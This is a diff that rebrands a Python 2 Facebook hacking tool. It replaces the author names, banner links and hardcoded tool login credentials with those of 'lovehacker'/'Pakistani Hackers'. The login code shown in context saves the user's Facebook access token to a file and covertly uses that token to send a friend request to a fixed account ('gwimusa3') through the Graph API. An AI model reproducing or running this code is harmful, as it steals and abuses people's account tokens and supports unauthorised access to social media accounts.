@@ -37,18 +37,18 @@ def jalan(z):
 		time.sleep(00000.1)
 ##### LOGO #####
 logo = """
-   God Father
+   Asif Javed
    ▄︻̷̿┻̿═━一
-   THE ANONYMOUS PRATIK 
+   THE ANONYMOUS lovehacker TRICKER 
    THE LEGEND ℒℴνℯ
    THE GAME CHANGER ℒℴνℯ
-   pratik here
+   pakistani hackers
    ℒℴνℯ ▄︻̷̿┻̿═━一
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mPratik
-\033[1;96mYouTube \033[1;93m: \033[1;92mPratik
-\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/godfatherhere7
-\033[1;96mBlogger \033[1;93m: \033[1;92mhttps://www.facebook.com/godfatherhere7
+\033[1;96mAuthor  \033[1;93m: \033[1;92mlove
+\033[1;96mYouTube \033[1;93m: \033[1;92mPakistani Hackers
+\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/lovehacker/love
+\033[1;96mBlogger \033[1;93m: \033[1;92mhttps://www.facebook.com/lovehacker
 \033[1;91m======================================="""
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -66,14 +66,14 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ========================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mgodfatherhere7
-\033[1;96mYouTube \033[1;93m: \033[1;92mgodfatherhere7
-\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/godfatherhere7
-\033[1;96mpage \033[1;93m: \033[1;92mhttps://www.facebook.com/godfatherhere7
+\033[1;96mAuthor  \033[1;93m: \033[1;92mlove
+\033[1;96mYouTube \033[1;93m: \033[1;92mlovehacker
+\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/lovehacker/love
+\033[1;96mpage \033[1;93m: \033[1;92mhttps://www.facebook.com/lovehacker
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
-CorrectUsername = "pratik"
-CorrectPassword = "8830955858"
+CorrectUsername = "lovehacker"
+CorrectPassword = "03094161457"
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;96m \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
@@ -127,7 +127,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m\x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.facebook.com/godfatherhere7')
+				os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
